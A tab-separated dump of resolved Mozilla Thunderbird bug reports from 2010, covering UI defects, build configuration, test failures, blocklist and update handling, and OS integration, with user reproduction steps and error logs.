HTML email.
600958%TAB%1285847535%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Message Reader UI%TAB%reload in standalone message window does nothing,write mozmill test for reload in standalone msg window%TAB%reload in standalone message window does nothing,write mozmill test for reload in standalone msg windowIf the front end calls ReloadMessage (e.g., the user has chosen to allow remote content), it does nothing. Patch upcoming.
600802%TAB%1285804512%TAB%112088%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Unnecessary separator at bottom of help menu on Mac following move of check for updates to Thunderbird menu%TAB%Unnecessary separator at bottom of help menu on Mac following move of check for updates to Thunderbird menumozilla-central has moved the "Check For Updates" option to the application menu.  On Thunderbird, this has left an unnecessary separator.  The attached patch fixes that by renaming our help menu separators to match those that the core code expects, so they can be hidden when necessary.
600140%TAB%1285622037%TAB%291638%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%'Unread' quick filter hides some unread messages (the beginning of a thread)%TAB%'Unread' quick filter hides some unread messages (the beginning of a thread)User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0C) Build Identifier: 3.1.4  For example, in a patch series, where there's [0/X pathes], followed by a number of patches [1..X], usually patch 0 email is hidden, even though it is unread yet. If I uncheck 'unread', I can see that email, and it is indeed unread. If I again click 'unread', it is now visible correctly - as part of the unread emails.  Reproducible: Always  Actual Results:   Does not show all unread messages, some are hidden.  Expected Results:   Should show all unread messages  Been happening ever since the quick filter feature came, so it's not a regression.
599797%TAB%1285532436%TAB%69594%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Mac builds broken by default architecture switch in gecko%TAB%Mac builds broken by default architecture switch in geckoconfigure: error: SDK not found.  When using --with-macos-sdk, you must specify a valid SDK.  SDKs are installed when the optional cross-development tools are selected during the Xcode/Developer Tools installation. *** Fix above errors and then restart with               "make -f client.mk build" make[2]: *** [configure] Error 1 make[1]: *** [objdir-tb/x86_64/Makefile] Error 2 make: *** [build] Error 2  See bug 599796 for a suggestion on how to revert to ppc+i386 universal builds.
599608%TAB%1285387061%TAB%382332%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Context menu selections are not functional in the Compose Window%TAB%Context menu selections are not functional in the Compose WindowUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 Build Identifier:   Mozilla/5.0 (Windows NT 5.1; rv:2.0b7pre) Gecko/20100924 Thunderbird/3.3a1pre  Undo, Cut, Copy, Paste and Select All are not functional in the Compose window.  Paste Without Formatting and Paste As Quotation are functional.  Reproducible: Always
599331%TAB%1285304463%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Have a nice icon for the Thunderbird Add-on Manager tab%TAB%Have a nice icon for the Thunderbird Add-on Manager tabIn Firefox there is a nice icon (extensionGeneric-16.png) for the Add-on Manager tab. In Thunderbird we now only habe a generic white icon. Would be nice if we could also have a nice Add-on Manager icon in Thunderbird.
599305%TAB%1285296179%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Make package-tests should package xpcshell-tests as well%TAB%Make package-tests should package xpcshell-tests as wellNow that we're libxul, we can package xpcshell-tests into package-tests as well.  This enables us to do a whole load of other things such as run xpcshell-tests on try server, and even switch production to running with package tests (yay! it also saves us builder time).  Here's the patch to add the hooks in to package xpcshell-tests. Note that currently we also have to package mochitests as they are the ones that give us the binaries we actually need.
599284%TAB%1285287948%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Implement alive ping counter for blocklist to strengthen user privacy%TAB%Implement alive ping counter for blocklist to strengthen user privacySee bug 597247 for the background  For this bug, the only needed patch is adding an integer url parameter to the blocklist request that increments on every request.
599260%TAB%1285279705%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Bugs found on the litmus run post libxul landing on trunk%TAB%Bugs found on the litmus run post libxul landing on trunkWe did a major architectural change in the way the application is built. Time to make sure that not much did regress.  This bug is here to tack those issue.   feel free to make bugs already found dependant.
599119%TAB%1285244261%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Investigate unnecessary plugin directory scans while loading messages,Investigate unnecessary plugin directory scans while loading messages, causes pauses/slow display during mail navigation or click%TAB%Investigate unnecessary plugin directory scans while loading messages,Investigate unnecessary plugin directory scans while loading messages, causes pauses/slow display during mail navigation or clickCurrently on Windows, each time we load a message we scan all directories where there could be plugins twice -- this delays message loads by a very significant amount. To see how bad the cost is, set plugin.scan.plid.all to false.  The call in <http://mxr.mozilla.org/comm-central/source/mozilla/uriloader/base/nsURILoader.cpp#455> (step 1) eventually lands in <http://mxr.mozilla.org/comm-central/source/mozilla/docshell/base/nsWebNavigationInfo.cpp#64>. IsTypeSupportedInternal returns UNSUPPORTED for content type message/rfc822, which causes a plugin dir scan immediately afterwards. Another scan happens at step 2, when the nsMsgWindow (as a registered content listener) passes the request to the docshell content listener <http://mxr.mozilla.org/comm-central/source/mailnews/base/src/nsMsgWindow.cpp#436>.  I had a look at nsDocumentViewer (the content viewer for documents) <http://mxr.mozilla.org/mozilla-central/source/layout/base/nsDocumentViewer.cpp> and it seemed far too complex for us to implement for message/rfc822. Our best bet might be to run the stream converter ourselves and provide text/html to the docshell -- David, is it possible to do so?
598353%TAB%1285053321%TAB%394677%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Disappearing email%TAB%Disappearing emailUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 Build Identifier: Mozilla/5.0 rv:1.9.2.9 Gecko/20100915 Thunderbird/3.1.4  I moved two posts from the junk folder to the in box but they never appeared there.  Reproducible: Always  Steps to Reproduce: 1.  Used drop down menu to move email from junk folder to inbox folder 2. 3. Actual Results:   email disappeared all together  Expected Results:   Mail should have disappeared from junk folder and reappeared in inbox
597997%TAB%1284955176%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Update xpinstall whitelist preferences%TAB%Update xpinstall whitelist preferencesLooking through our preferences file, I realised we need to port bug 511771 and update our xpinstall whitelist preferences.  I noticed that there's a remote chance with Lightweight themes that we might actually effectively not allow addons.mozilla.org, although it would just end up in an extra allow prompt.  This patch ports the changes and fixes the code.
597985%TAB%1284949758%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Port bug 454300 to Thunderbird - Remove locale-specific subdomains from client-generated URLs%TAB%Port bug 454300 to Thunderbird - Remove locale-specific subdomains from client-generated URLsPer bug 398938 (this bug would likely have to be fixed first before the functionality is removed), we should remove the locale-specific subdomains Firefox client-generated URLs.    With the same applying to Thunderbird, of course. Of the instances we have left in all-thunderbird.js:  extensions.blocklist.detailsURL handled by bug 597982 extensions.getMore*URL handled by bug 571759  the remaining two by this bug.  Bug 454300 got back-ported to 1.9.2 only, so we'll do the same here, but I'll need to do a separate patch so that the prefs on bug 571759 are handled on branch.
597982%TAB%1284948246%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Blocklist url updates for Thunderbird - Change blocklist more information url to https and support specifying application range for plugins in blocklist.xml%TAB%Blocklist url updates for Thunderbird - Change blocklist more information url to https and support specifying application range for plugins in blocklist.xmlThis patch will port two bugs that I noticed we haven't updated for yet:  Bug 468526 Make the blocklist more information url https http://hg.mozilla.org/mozilla-central/rev/6bf12c7664b8  Bug 449027 Support specifying application range for plugins in blocklist.xml http://hg.mozilla.org/mozilla-central/rev/f85ebe02a384  In the latter case, the only thing that needs changing is the version number of the url, plus we can take the full version of the new blocklist for the bit that we ship within Thunderbird.
596964%TAB%1284610444%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%nsINIProcessor.js is being incorrectly removed on TB 3.1 upgrades%TAB%nsINIProcessor.js is being incorrectly removed on TB 3.1 upgradesLooking through the 3.1.4 build logs, I discovered that nsINIProcessor.js is being removed on automated update, even though its included in fresh builds.  Looks like we were originally excluding it from 3.1x builds and then it was back ported into the 3.1x series and we missed removing it from removed-files.in.  From what I can tell, the worst case is that it affects a bit of about:crashes functionality - something we don't have by default, therefore we don't need to urgently get this in a build, but we should just fix it up in case extensions use it.
596803%TAB%1284562375%TAB%98534%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Crash on certain mail start page url's if methodjit enabled%TAB%Crash on certain mail start page url's if methodjit enabledSTR: Use the url referenced above as your mail start page  Have the preview pane opened Go>>Mail start page Crash with no crash data available  Set javascript.options.methodjit.content to false. Start page works fine.  This seems to happen only if the mail start page contain Javascript.  Testing with:20100915 Thunderbird/3.3a1pre 20100910 build works fine, so it looks like The JM landing.
596196%TAB%1284433872%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Build Config%TAB%Include a default blocklist.xml in Thunderbird for releases%TAB%Include a default blocklist.xml in Thunderbird for releasesIncluding a blocklist.xml will mean that Thunderbird users are protected from issues (e.g. crashes, incompatibilities etc) from very first startup rather than the first blocklist check which could be up to 24 hours later.  It also gives us a way to deploy blocklist changes should the automatic mechanism be disabled for some reason (as has recently been seen).
595723%TAB%1284297611%TAB%393703%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%If Thunderbird is the default client for e-mail, newsgroups and feeds, the dialog only shows that Thunderbird is the default client for e-mail%TAB%If Thunderbird is the default client for e-mail, newsgroups and feeds, the dialog only shows that Thunderbird is the default client for e-mailUser-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 Build Identifier: Thunderbird/3.1.3  If I go to Thunderbird > Preferences > Advanced > General, and click Check Now:  If Thunderbird is the default client for e-mail, newsgroups and feeds:  Actual behavior: I get a message that Thunderbird is the default client for e-mail.  Expected behavior: I get the dialog that shows that Thunderbird is the default client for e-mail, newsgroups and feeds.  Reproducible: Always  Steps to Reproduce: 1. (Mac OS X) Thunderbird > Preferences > Advanced > General 2. Click Check Now. 3. If you get a dialog that shows one or more  unchecked, clickable checkboxes for e-mail, newsgroups or feeds, check those boxes and click OK; otherwise, skip to results. 4. Click Check Now. Actual Results:   Get the message Thunderbird is already set as your default e-mail client.  Expected Results:   (given Thunderbird 3.1.3): Get the dialog with the three check boxes for e-mail, newsgroups and feeds.
595654%TAB%1284273873%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%MultiMessageSummary and ThreadSummary should ensure multimessageview.xhtml is loaded before proceeding%TAB%MultiMessageSummary and ThreadSummary should ensure multimessageview.xhtml is loaded before proceedingSo I was working on "Thunderbird Conversations" the other day, and it turned out I had broken the MultiMessageSummary. Actually, I just realized that MultiMessageSummary assumes that the right URL is loaded in the multimessage pane, and proceeds without even checking that multimessageview.xhtml is actually loaded.  What I did was make a monkey-patch on top of the summarizeMultipleSelection function that first restores the right url before handing control flow over the original summarizeMultipleSelection once multimessageview.xhtml is loaded.  I think the original implementations of summarizeThread and summarizeMultipleSelection should take care of this. I don't think this is just a case of "patch Thunderbird to suit my needs", because I'm pretty sure the extension that does account summary and folder summary has to workaround this too, and this might simplify its life if it could just assume that whenever someones actually needs to display something in the multimessage pane, then that someone takes care of having the right URL loaded.  davida, mixedpuppy, thoughts?  (I have a patch waiting somewhere so if you think that's a good idea, I'll just assign to me and submit a patch as soon as I have a decent development environment and work machine).
595644%TAB%1284269911%TAB%393679%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Thunderbird starts with empty folder pane,Thunderbird starts with empty folder pane when folder discovery broken by "duplicate" names // 0x80550013 == NS_MSG_FOLDER_EXISTS%TAB%Thunderbird starts with empty folder pane,Thunderbird starts with empty folder pane when folder discovery broken by "duplicate" names // 0x80550013 == NS_MSG_FOLDER_EXISTSUser-Agent:       Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.9) Gecko/20100824 SUSE/3.6.9-1.2 Firefox/3.6.9 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.9) Gecko/20100824 SUSE/3.1.3 Thunderbird/3.1.3  Operating system: OpenSuse 10.3 About Mozilla: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.9) Gecko/20100824 SUSE/3.1.3 Thunderbird/3.1.3  If a long list is displayed in left pane (folder pane) and thunderbird is closed, upon next start of thunderbird the folder pane is empty. Exiting and starting thunderbird again does not help: the pane is empty and the folder structure is not displayed.  I found two ways to circumvent the problem and see the folder structure again: a) use the right arrow button above the (empty) folder list and select anything except "All Folders". E.g. select "Unread Folders", or "Recent Folders", ... If then th. is restarted, the folder list is displayed again. b) the error only occurs if th. is closed when a scrollbar is available (folder list is too long to fit into the pane, i. e. the structure is expanded to show some sub folders). Therefore a workaround is to shrink the list by de-expanding sub structures so far that no scrollbar is needed. Then you can safely close thunderbird. Upon next start, the pane shows the structure.  Reproducible: Always  Steps to Reproduce: 1.expand folder list in folder pane so far, that a scrollbar appears because the list is too long to fit into the pane 2.restart thunderbird 3.folder pane is empty (see Details) Actual Results:   Folder pane is empty  Expected Results:   Folder pane displays the folder structure of my email accounts  My folder pane contains the structure (Inbox, Drafts, Templates, Sent, Junk, Trash,and some more names with sub folders) for 4 different email accounts plus some news servers. So it is quite long and if some folders are expanded to show the sub folders, I usually have a scrollbar and the problem occurs.  By try and error I found the workaround to select e.g. "Unread Folders" and restart thunderbird. So I know a way to display the folder list again.
594991%TAB%1284041327%TAB%42319%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Change -moz-border-radius* properties to css3-background names in mail/,Change -moz-border-radius* to css3-background names and '-moz-box-shadow' to 'box-shadow' in mail/,Change -moz-border-radius* properties to css3-background names in mail/%TAB%Change -moz-border-radius* properties to css3-background names in mail/,Change -moz-border-radius* to css3-background names and '-moz-box-shadow' to 'box-shadow' in mail/,Change -moz-border-radius* properties to css3-background names in mail/It's now possible to drop the -moz prefix in the theme files. One could just use Zack's script at https://bugzilla.mozilla.org/show_bug.cgi?id=451134#c45.  I admit I haven't tested this, but it should be OK (this is the third time it's done)
594768%TAB%1284009919%TAB%393340%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Folder and Message Lists%TAB%Can't empty Trash%TAB%Can't empty TrashUser-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.9) Gecko/20100825 Ubuntu/10.04 (lucid) Firefox/3.6.9 Build Identifier:   On clicking "Empty Trash" in popup menu of the Local Folders trash I get this inside the Error Console:  Error: uncaught exception: [Exception... "Component returned failure code: 0x80004003 (NS_ERROR_INVALID_POINTER) [nsIMsgFolder.updateFolder]"  nsresult: "0x80004003 (NS_ERROR_INVALID_POINTER)"  location: "JS frame :: file:///usr/lib/thunderbird-3.0.7/modules/dbViewWrapper.js :: FolderNotificationHelper_notifyOnLoad :: line 131"  data: no]  Reproducible: Always  Steps to Reproduce: 1.Right click on Trash 2.Choose "Empty Trash" 3.Wait for the hour glass to go away (It does because I still can browse mails inside Thunderbird!) Actual Results:   Nothing.  Expected Results:   An empty Trash  Also, deleting a message prompts me, that the Trash is full.
594759%TAB%1284008648%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Message Compose Window%TAB%test-signature-updating.js fails permanently following bug 592592 changes to non-breaking spaces%TAB%test-signature-updating.js fails permanently following bug 592592 changes to non-breaking spacesSince bug 592592 landed, test-signature-updating.js has been failing permanently with:  TEST-UNEXPECTED-FAIL | test-signature-updating.js | testHTMLComposeWindowSwitchSignatures   EXCEPTION: a != b: '-- ' != '-- Tinderbox is soo 90ies'.     at: test-folder-display-helpers.js line 2527        Error("a != b: '-- ' != '-- \nTinderbox is soo 90ies'.")  0        assert_true(false,"a != b: '-- ' != '-- \nTinderbox is soo 90ies'.") test-folder-display-helpers.js 2527        assert_equals("-- ","-- \nTinderbox is soo 90ies") test-folder-display-helpers.js 2521        testHTMLComposeWindowSwitchSignatures() test-signature-updating.js 144             frame.js 474             frame.js 530             frame.js 573             frame.js 426             frame.js 585             server.js 164             server.js 168 TEST-PASS |  teardownModule TEST-UNEXPECTED-FAIL | (runtestlist.py) | Exited with code 1 during directory run  It appears that the \n has now been replaced by a separate <br> node. I don't think this is an error in the code, but maybe an unexpected correction? Looking further down the unit test, we actually check for "-- " followed by a <br> node, so it could be that the editor code is now behaving the same way in both cases.  On that assumption, I'm proposing to fix the test to match the code, but asking ehsan to take a look at it to be sure we're doing the right thing.
594732%TAB%1284000886%TAB%382332%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Layout,Backend,Mail Window Front End%TAB%Broken statusbar,Broken statusbar: unread and total messages labels are on left. Other informations are missing,Broken statusbar: unread and total messages labels are on left. Other informations are missing (e.g. offline indicator)%TAB%Broken statusbar,Broken statusbar: unread and total messages labels are on left. Other informations are missing,Broken statusbar: unread and total messages labels are on left. Other informations are missing (e.g. offline indicator)User-Agent:       Mozilla/5.0 (Windows NT 5.1; rv:2.0b6pre) Gecko/20100908 Firefox/4.0b6pre Build Identifier:   Statusbar is broken.  Screenshot: http://img20.imageshack.us/content_round.php?page=done&l=img20/8703/tbirdbustedstatusbar.png  Reproducible: Always
594369%TAB%1283922291%TAB%33744%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Message panel 'sender' header is not aligned to the right on RTL Thunderbird 3.1,Message header is not aligned to left on RTL Thunderbird%TAB%Message panel 'sender' header is not aligned to the right on RTL Thunderbird 3.1,Message header is not aligned to left on RTL ThunderbirdOn Thunderbird 3.1, we've merged the sender header with the reply/forward buttons. A forum post on mozilla-il [1] hints that we have forgot to make sure it is aligned to the right window edge like other message headers.   I'll be attaching screenshots to demonstrate the issue. These images were captured by Nethaneel.    [1] http://mozilla.org.il/board/viewtopic.php?t=9292
594021%TAB%1283838506%TAB%393057%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Attached .rtf files are opened as though they were flat text (TXT) files and show all the control characters%TAB%Attached .rtf files are opened as though they were flat text (TXT) files and show all the control charactersUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 Build Identifier: v3.1.2  Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100802 Thunderbird/3.1.2  When I double click on a .rtf (Rich Text Format) file attached to an email I have received, the default application (I have associated OpenOffice Writer which can read .rtf files) opens the file as a flat text (ie a TXT) file and displays all the control characters.  It does not respect the .rtf qualifier.  If the file is called fred.rtf, the OO Writer bar shows "fred.rtf-4.txt (Read only) - OpenOffice.org Writer".  The 4 increments by 1 every time I retry.  This means that Thunderbird appears to have appended a TXT qualifier after the RTF qualifier.  OO Writer is therefore being told that this is a TXT file, not an RTF file.  No doubt this is why I see all the control characters.  If I detach fred.rft and save it to my hard disk, OpenOffice opens the file properly and I see the correct contents.  This is as expected - OpenOffice can read and write .rtf files.  The file is obviously OK.  I am running Windows 7 so I looked in the temporary folder C:\Users\my_name\AppData\Local\Temp where Thunderbird creates the temporary, read only file it views. When I double clicked on the .rtf file attached to the email, a file called fred.rtf.txt appeared in the Temp folder, and OpenOffice opened this file.   If I forward the received email with the attached fred.rtf file, then while I am editing the email I am forwarding, I can open the attached fred.rtf file with Writer, and it opens OK.  When I check in the Temp folder, the file Thunderbird has created is called nsmail-8.tmp - ie it is NOT a TXT, nor an RTF file. OO obviously pens this TMP file OK.  The email header is: Content-Type: application/octet-stream; name="fred.rtf" Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename="fred.rtf"  As a test, I renamed the file in \Temp from fred.rtf.txt to fred.rtf - that is I just removed the extra .txt extension added by Thunderbird.  When I double clicked on the renamed file in the Temp folder, it opened OK in OO.   Some recipients of my emails with attached RTF files have commented that they cannot open the RTF files.   There appear to be a number of similar bugs reported - namely https://bugzilla.mozilla.org/show_bug.cgi?id=213393, https://bugzilla.mozilla.org/show_bug.cgi?id=205871 and https://bugzilla.mozilla.org/show_bug.cgi?id=580585  Reproducible: Always  Steps to Reproduce: 1.  Create an RTF file called fred.rtf which contains the single text word zebra.  2.  Edit and email and attach the file fred.rtf to the email.  3.  While I am editing the email, if I click on fred.rtf, it opens OK and I see the word zebra.  4  Send myself the email.    5  Receive the email and click on the fred.rtf attachment in order to open it.  It opens with my default application OpenOffice Writer, but all the control characters are shown, namely {\rtf1\ansi\deff0\adeflang1025 {\fonttbl{\f0\froman\fprq2\fcharset0 Times New Roman;}{\f1\froman\fprq2\fcharset0 Times New Roman;}{\f2\fswiss\fprq2\fcharset0 Arial;}{\f3\froman\fprq2\fcharset0 Times New Roman;}{\f4\froman\fprq0\fcharset0 Times New Roman;}{\f5\fnil\fprq0\fcharset0 times new roman{\*\falt new york};}{\f6\fmodern\fprq1\fcharset128 MS Mincho{\*\falt \'82\'6c\'82\'72 \'96\'be\'92\'a9};}{\f7\fnil\fprq0\fcharset0 Mangal;}} ... etc  3  Detach fred.rtf from the email and store it on my hard disk.  Open it with OO - it opens OK and I see the word zebra.   Expected Results:   When I open an RTF file I expect to see only the formatted text - I do not expect to see all the control characters.  A workaround is to detach the rtf file from the email before opening.  Why does the temporary file in C:\ ...\Temp have TXT added as its qualifier after RTF??  Windows 7 Home 64 bit, 4GB, dual core CPU
593948%TAB%1283824105%TAB%379511%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%System integration - Default mail client setting not integrated well%TAB%System integration - Default mail client setting not integrated wellThis bug was reported in Launchpad: https://launchpad.net/bugs/630281  Currently, when you set Thunderbird to be the default mail client from the Thunderbird UI on GNOME, it sets "/desktop/gnome/url-handlers/mailto/command" to something like $XCurProcD/thunderbird (on Ubuntu, this path is currently /usr/lib/thunderbird-3.1.3/thunderbird).  This has a couple of problems:  1) It breaks upgrades if the path has the version number in it (which is the Ubuntu bug). Ok, I suppose that could also be argued as a distro-problem too.  2) It causes the default mail client in gnome-default-application-properties to be displayed as "Custom" rather than "Thunderbird". This is because the settings dialog expects the setting to just be an executable in the users path. I suppose that could be changed too, but that isn't how other applications work.  3) Setting the default mail client in gnome-default-application-properties to Thunderbird doesn't stop Thunderbird asking to be the default mail client.  The way I think that this should work is:  1) If thunderbird is in the users path and it is a symbolic link to something in $XCurProcD, set the key to "thunderbird %s", else... 2) Fall back to "$XCurProcD/thunderbird %s".  So, most users with a single install of Thunderbird will have the key set to "thunderbird %s". It also allows for users to download, extract and run other instances of Thunderbird if they want to, and still be able to set them as the default mail client too, without installing them properly (it would just use the full path for those in that case).  Attached is a first attempt at a patch to implement this behaviour, which is working ok here.
593795%TAB%1283741662%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Need warning for moving cards via the message header if the cards exist in a list%TAB%Need warning for moving cards via the message header if the cards exist in a listFollow-up to bug 456167.  We need a warning if cards exist in a mailing list and the user then attempts to move the card to a different address book.  Currently, that moving will cause the link to the mailing list to be lost without warning.
593723%TAB%1283688509%TAB%376925%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%cannot open more than 9 messages at a time in Thunderbird 3.1.2%TAB%cannot open more than 9 messages at a time in Thunderbird 3.1.2User-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100723 Fedora/3.6.7-1.fc13 Firefox/3.6.7 Build Identifier: 3.1.2  Description of problem: It used to be that I could highlight a number of messages in a folder and open them all at the same time; if it was more than a certain number (10-20, I don't really know which), I'd get a warning saying "opening multiple messages may take time, do you want to continue?" and if I said "yes" it would continue.  I tried this today in TB 3.0.3, and found that if I have more than 9 messages highlighted, nothing happens when I try to open them -- no error message, no opened emails.   Reproducible: Always  Steps to Reproduce: 1. Select more than 10 messages 2. Hit "enter". 3.  Actual Results:   Nothing.  Expected Results:   Either all of the highlighted messages should open, or an error message saying that this many messages cannot be opened at one time should appear.   This bug has been previously reported on fedora's bugzill: https://bugzilla.redhat.com/show_bug.cgi?id=574521
593710%TAB%1283681199%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%JavaScript error: "invalid 'in' operand window.arguments[1]" opening a folder in a new window%TAB%JavaScript error: "invalid 'in' operand window.arguments[1]" opening a folder in a new windowNot serious, but still nice to fix. This happens because the operator in doesn't work on strings.
593571%TAB%1283566976%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installer,Preferences%TAB%Support signed updates in Thunderbird%TAB%Support signed updates in ThunderbirdBug 583408 added a few default prefs, see that bug and bug 593135 for some of the things we need to pull across.
593321%TAB%1283480102%TAB%160105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Opening saved .EML with empty subject has wrong window title%TAB%Opening saved .EML with empty subject has wrong window titleWhen you save a message with an empty subject line and open it again by double clicking the file, you get a window with "nullMozilla Thunderbird" as title. When you view the same message from within Thunderbird, you only see "Thunderbird" as title.  Steps to Reproduce: 1. Compose a message with an empty subject line and send it to yourself 2. View the message in a new window in thunderbird and verify the window title is "Mozilla Thunderbird" 3. Save the message as a file 4. Open the saved file and see the window title is now "nullMozilla Thunderbird"  The subject displayed in the window title should be the same as when viewed from within Thunderbird, so without the null part.
593004%TAB%1283394960%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Search%TAB%Quick search selected filters are ellipsoids not squared with rounded corners anymore%TAB%Quick search selected filters are ellipsoids not squared with rounded corners anymoreI'm pretty sure this regressed either today or yesterday. I'm filling this in Thunderbird but it's probably a Core issue, feel free to move to the appropriate component (which I'm unable to figure out).  See the screenshot for how the selection appears on filters in the quick search bar.   getting that with Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:2.0b6pre) Gecko/20100901 Thunderbird/3.2a1pre
592952%TAB%1283374550%TAB%122059%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%securityOverride.warningText should changed to securityOverride.warningContent%TAB%securityOverride.warningText should changed to securityOverride.warningContentWhen start TB in the environment where HTTP was disabled, I got following error: XML Parsing Error:                                                                                                                                                                                     Location: jar:file:///export/home/brian/moz-ws/community/0811/thunderbird/mozilla/dist/bin/chrome/toolkit.jar!/content/global/netError.xhtml Line Number 385, Column 68:          <div id="securityOverrideContent" style="display: none;">&securityOverride.warningContent;</div>
590226%TAB%1282640699%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Notification bar for Junk Mail is not very informative%TAB%Notification bar for Junk Mail is not very informativeCurrently the junk mail notification bar consists of three items: 1. An icon 2. A small snippet of text saying "Junk Mail" 3. A button saying "Not Junk"  The text saying Junk mail is not informative enough. Maybe having it saying something like "Thunderbird thinks this is junk mail" instead.  I bet there is an ux-principle for this.
588786%TAB%1282200492%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Error: assignment to undeclared variable index, at lots of places in msgHdrViewOverlay.js%TAB%Error: assignment to undeclared variable index, at lots of places in msgHdrViewOverlay.jsI switched whatever I could find to use let + an Iterator. I haven't touched let/var + non-Iterator uses, though.
588754%TAB%1282190599%TAB%29811%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%address autocomplete, selected address' characters are white%TAB%address autocomplete, selected address' characters are whiteaddress autocomplete, selected address' characters are white, can't read  default thunderbird theme OS window theme vista basic   Mozilla/5.0 (Windows NT 6.0; rv:2.0b5pre) Gecko/20100818 Shredder/3.2a1pre
588753%TAB%1282190089%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%mailContentHandler.js needs updating for component registration changes (opening text files as attachments broken)%TAB%mailContentHandler.js needs updating for component registration changes (opening text files as attachments broken)During the component registration changes we missed updating mailContentHandler.js, we need to do this else opening text files as attachments (and other things) will be broken.
588048%TAB%1282025337%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Mail Window Front End%TAB%test_viewWrapper_virtualFolder.js intermittently hangs on Linux%TAB%test_viewWrapper_virtualFolder.js intermittently hangs on Linuxtest_viewWrapper_virtualFolder.js is intermittently hanging on our Linux builders and causing xpcshell-tests to timeout.  Unforunately there's nothing useful in the tinderbox log: http://tinderbox.mozilla.org/showlog.cgi?log=Thunderbird/1282049059.1282056227.11123.gz  TEST-INFO | /buildbot/linux-comm-central-check/build/objdir/mozilla/_tests/xpcshell/test_mailbase/unit/test_viewWrapper_virtualFolder.js | running test ...  command timed out: 300 seconds without output, killing pid 8158  I'll see if I can get some more info.
588007%TAB%1282017666%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Folder and Message Lists%TAB%Investigate using monochrome icons for the headers%TAB%Investigate using monochrome icons for the headersOne thing that would make Thunderbird look a bit neater under Windows would be if we could use monocrome icons for the headers. This would make it sit better together with the color of the text. Both Postbox and Windows Live mail does this.  One thing that could block this is that we currently can't call svg's from lists, so we can't color the icon in the same color as the text.
